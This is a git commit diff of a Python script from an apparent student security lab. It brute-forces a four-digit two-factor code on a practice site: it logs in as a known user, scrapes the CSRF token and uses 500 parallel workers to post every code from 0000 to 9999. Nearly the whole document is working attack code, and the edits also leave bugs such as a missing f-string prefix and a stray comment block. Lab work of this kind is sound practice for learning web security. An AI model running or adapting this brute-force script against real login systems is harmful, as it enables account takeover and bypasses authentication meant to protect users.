2984ceeef8a117aa16203d23532d5ce471074d85
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-16 17:40:39 -0700

    this code solved the lab

--- Lab Notebook #1/hw1/hw1.py
+++ Lab Notebook #1/hw1/hw1.py
@@ -4,23 +4,26 @@ from bs4 import BeautifulSoup
 import multiprocessing
 # import numpy as np
 
+# To create a single session
+global s
+global site
+
 
 def Check_Second_Factor_Code(web_response, factor_code):
     if web_response == 302:
-        print(f'\n\n\n2fa valid with response code {web_response}')
-        print(f'2fa valid code: {factor_code}\n\n\n')
-        found_code.set()
+        print(f'\n\n\n\n\n\n\n\n\n\n\n\n\n2fa valid with response code {web_response}')
+        print(f'2fa valid code: {factor_code}\n\n\n\n\n\n\n\n\n\n\n\n\n')
+        s.get('https://{site}/my-account?id=carlos')
         # Visit account profile page to complete level
+"""
     else:
-        print(f'2fa invalid with response code: {web_response}')
+        print("\n")
+        # print(f'2fa invalid with response code: {web_response}')
+        # print(f'2fa invalid code: {factor_code}')
+"""
 
 
 def Login_to_account(factor_code):
-    site = sys.argv[1]
-    if 'https://' in site:
-        site = site.rstrip('/').lstrip('https://')
-
-    s = requests.Session()
     login_url = f'https://{site}/login'
 
     resp = s.get(login_url)  # new one each time, otherwise boot
@@ -33,29 +36,34 @@ def Login_to_account(factor_code):
         'password': 'montoya'
     }
     # print(f'Logging in as carlos:montoya')
-    print(f'Using 2FA code: {factor_code}')
+    # print(f'Using 2FA code: {factor_code}')
     resp = s.post(login_url, data=logindata)
     # print(f'Login response: {resp.text}')
 
     soup = BeautifulSoup(resp.text, 'html.parser')
     csrf = soup.find('input', {'name': 'csrf'}).get('value')
-    print(f'CSRF: {csrf}')
+    # print(f'CSRF: {csrf}')
     login2_url = f'https://{site}/login2'
     login2data = {
         'csrf': csrf,
         'mfa-code': str(factor_code).zfill(4)
     }
-    resp = s.post(login2_url, data=login2data, allow_redirects=False)
-    Check_Second_Factor_Code(resp.status_code)
+    resp = s.post(login2_url, data=login2data, allow_redirects=True)
+    Check_Second_Factor_Code(resp.status_code, factor_code)
 
 
 if __name__ == '__main__':
-    # Event variable to set when found correct 2fa
-    found_code = multiprocessing.Event()
+    site = sys.argv[1]
+    if 'https://' in site:
+        site = site.rstrip('/').lstrip('https://')
+
+    s = requests.Session()
+
     # Generate a list of 0-9999
     factor_code_list = list(i for i in range(10000))
     # Get alot of workers.
-    workers = multiprocessing.cpu_count() * 20
+    # workers = multiprocessing.cpu_count() * 21
+    workers = 500
 
     with multiprocessing.Pool(workers) as w:
         w.map(Login_to_account, factor_code_list)
